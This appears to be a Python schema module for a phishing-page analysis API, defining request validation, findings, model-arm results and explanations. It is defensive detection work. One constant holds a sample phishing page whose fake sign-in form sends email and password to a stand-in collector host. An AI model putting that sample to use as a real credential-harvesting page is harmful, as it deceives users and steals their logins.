"""Unified API request / response of ``POST /api/v1/analyze`` (schema ``c2.analysis.v1``).

Part 9: Batch B-1 - end-to-end URL analysis engine.

One contract for every caller (team frontend, ThreatRadar, scripts): a URL (C2 fetches
it safely) OR raw HTML (+ optional URL, never fetched). The response always has the same
shape, whatever happened:

- ``status`` ok | inconclusive | unreachable | error - only ``ok`` (and an inconclusive
  page whose evidence floor fired) carries a ``verdict``; an unreachable URL never gets
  one, because "we could not see the page" is not "the page is safe".
- ``findings`` are plain-English reasons with a short, PII-masked evidence snippet or a
  domain - never raw page HTML (the frontend renders them as text only).
- ``modalities`` / ``degraded`` say which arms answered: one failing arm must not fail
  the request, and the caller must be able to see that the verdict used fewer arms.
"""

from __future__ import annotations

from datetime import datetime
from typing import Any, Literal
from urllib.parse import urlsplit

from pydantic import BaseModel, ConfigDict, Field, field_validator, model_validator

SCHEMA_VERSION = "c2.analysis.v1"
MAX_URL_CHARS = 2048

Verdict = Literal["Legitimate", "Suspicious", "Malicious"]
Status = Literal["ok", "inconclusive", "unreachable", "error"]
Severity = Literal["critical", "high", "medium", "low", "info"]
FindingModality = Literal["dom", "content", "behavior", "fetch", "fusion"]
StepStatus = Literal["ok", "failed", "skipped"]

SEVERITY_RANK: dict[str, int] = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}

EXAMPLE_PHISHING_HTML = (
    "<html><head><title>Verify your account</title></head><body>"
    "<h1>Account suspended</h1><p>Sign in within 24 hours or your account is closed.</p>"
    '<form action="https://collector.example/login.php" method="post">'
    '<input type="email" name="email"><input type="password" name="pass">'
    "<button>Sign in</button></form></body></html>"
)


def check_http_url(value: str | None) -> str | None:
    """http(s) URL with a host, at most 2,048 characters (else ValueError -> 422)."""
    if value is None:
        return None
    value = value.strip()
    if not value:
        return None
    if len(value) > MAX_URL_CHARS:
        raise ValueError(f"url longer than {MAX_URL_CHARS} characters")
    try:
        parts = urlsplit(value)
    except ValueError as error:
        raise ValueError(f"invalid url: {error}") from None
    if parts.scheme.lower() not in ("http", "https"):
        raise ValueError("url scheme must be http or https")
    if not parts.hostname:
        raise ValueError("url has no host")
    return value


class AnalysisRequest(BaseModel):
    """Input to ``POST /api/v1/analyze``: ``url`` (fetched by C2) OR ``html`` (+ ``url``)."""

    model_config = ConfigDict(
        extra="forbid",
        json_schema_extra={
            "examples": [
                {"url": "https://example.com/", "source": "user", "request_id": "ui-42"},
                {
                    "html": EXAMPLE_PHISHING_HTML,
                    "url": "https://account-verify.example/login",
                    "source": "api",
                },
            ]
        },
    )

    url: str | None = Field(
        default=None,
        max_length=MAX_URL_CHARS,
        description="page address: fetched by C2 when no html is given, otherwise only used "
        "to resolve links (never fetched)",
    )
    html: str | None = Field(
        default=None, description="raw HTML (paste / test mode): skips the fetch; <= 5 MB"
    )
    request_id: str | None = Field(
        default=None,
        max_length=128,
        pattern=r"^[A-Za-z0-9._:\-]+$",
        description="caller's id, echoed back",
    )
    source: Literal["user", "threatradar", "api"] = "api"

    @field_validator("url")
    @classmethod
    def _url(cls, value: str | None) -> str | None:
        return check_http_url(value)

    @model_validator(mode="after")
    def _one_input(self) -> AnalysisRequest:
        if self.html is None and not self.url:
            raise ValueError("give a url, or html (+ optional url)")
        return self

    @property
    def mode(self) -> Literal["url", "html"]:
        return "html" if self.html is not None else "url"


class AnalysisInput(BaseModel):
    """What was analyzed and how it was obtained."""

    mode: Literal["url", "html"]
    submitted_url: str | None = None
    final_url: str | None = None  # after redirects (PII in the query masked)
    redirect_hosts: list[str] = Field(default_factory=list)  # every hop's host, in order
    http_status: int | None = None
    content_type: str | None = None
    html_bytes: int | None = None


class EvidenceStep(BaseModel):
    """One numbered line of a behavior finding's source -> sink chain (Part 8)."""

    kind: str  # flow_step / source / sink / detection / html / script
    line: int | None = None
    code: str  # PII-masked, tags stripped, <= 120 chars
    note: str | None = None


class AnalysisFinding(BaseModel):
    """One human-readable reason, ranked by severity."""

    id: str  # stable rule / feature id, e.g. "behavior.credential_exfiltration.external"
    modality: FindingModality
    severity: Severity
    title: str
    detail: str  # plain English
    evidence: str | None = None  # short PII-masked snippet or a URL domain, never raw HTML
    raises_verdict: bool = False  # an evidence-floor rule that fired
    # Part 9 B-2 (dashboard): behavior findings carry their evidence chain (<= 8 steps,
    # in order); empty for every other finding. Optional, so older clients are unaffected.
    steps: list[EvidenceStep] = Field(default_factory=list)


class ArmResult(BaseModel):
    """One model arm (DOM-only, Behavior-only, Text TF-IDF, Text XLM-R)."""

    arm: str
    display: str
    status: StepStatus
    reason: str | None = None
    predicted: str | None = None
    probabilities: dict[str, float] | None = None
    fusion_weight: float | None = None  # renormalized weight used for THIS request


class ModalityResult(BaseModel):
    """dom / content / behavior: did it run, what did it say."""

    status: StepStatus
    reason: str | None = None
    summary: str | None = None
    top_evidence: list[str] = Field(default_factory=list)
    arms: list[ArmResult] = Field(default_factory=list)


class Modalities(BaseModel):
    dom: ModalityResult
    content: ModalityResult
    behavior: ModalityResult


class FeatureDriver(BaseModel):
    arm: str
    feature: str
    value: float
    contribution: float
    text: str


class Explanation(BaseModel):
    """Why the fused model said what it said (arm level + top inputs)."""

    verdict_source: Literal["fusion", "evidence_floor", "none"] = "none"
    explained_class: str | None = None
    method: str | None = None  # "renormalized weight x arm probability"
    arm_contributions: dict[str, float] = Field(default_factory=dict)
    driving_arm: str | None = None
    top_features: list[FeatureDriver] = Field(default_factory=list)
    evidence_floor_rules: list[str] = Field(default_factory=list)  # rule ids that fired
    arms_used: list[str] = Field(default_factory=list)
    thresholds: dict[str, Any] = Field(default_factory=dict)  # the tier cut-offs applied


class AnalysisResponse(BaseModel):
    """Unified tri-modal output (``c2.analysis.v1``)."""

    analysis_id: str
    request_id: str | None = None
    schema_version: str = SCHEMA_VERSION
    analyzed_at: datetime
    source: Literal["user", "threatradar", "api"] = "api"
    cached: bool = False
    input: AnalysisInput
    status: Status
    status_reason: str | None = None
    verdict: Verdict | None = None
    threat_class: str | None = None
    risk_score: int | None = Field(default=None, ge=0, le=100)
    class_probabilities: dict[str, float] = Field(default_factory=dict)
    page_language: str | None = None
    findings: list[AnalysisFinding] = Field(default_factory=list)
    findings_total: int = 0
    findings_omitted: int = 0
    modalities: Modalities
    explanation: Explanation = Field(default_factory=Explanation)
    degraded: bool = False
    warnings: list[str] = Field(default_factory=list)
    model_versions: dict[str, str | None] = Field(default_factory=dict)
    timings_ms: dict[str, float] = Field(default_factory=dict)


class ReadyResponse(BaseModel):
    """``GET /ready``: are the models loaded (and which)."""

    ready: bool
    loading: bool = False
    reason: str | None = None
    xlmr_enabled: bool
    arms: dict[str, dict[str, Any]] = Field(default_factory=dict)
    model_versions: dict[str, str | None] = Field(default_factory=dict)
    load_ms: float | None = None
